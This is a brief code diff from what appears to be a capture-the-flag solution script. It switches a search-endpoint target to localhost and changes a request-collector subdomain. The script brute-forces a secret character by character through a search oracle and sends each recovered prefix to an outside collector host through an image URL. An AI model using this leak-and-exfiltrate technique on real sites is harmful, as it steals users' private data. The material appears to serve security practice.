@@ -14,7 +14,7 @@
 
     async function search(query) {
         try {
-            await req(`http://host3.dreamhack.games:23832/search?query=${query}`);
+            await req(`http://localhost:8000/search?query=${query}`);
             return true;
         } catch (e) {
             return false;
@@ -29,7 +29,7 @@
             for (let c of chars) {
                 if (await search(secret + c)) {
                     secret += c;
-                    img.src = `https://pukbtdu.request.dreamhack.games/${secret}`;
+                    img.src = `https://tbhcndq.request.dreamhack.games/${secret}`;
                     break;
                 }
             }
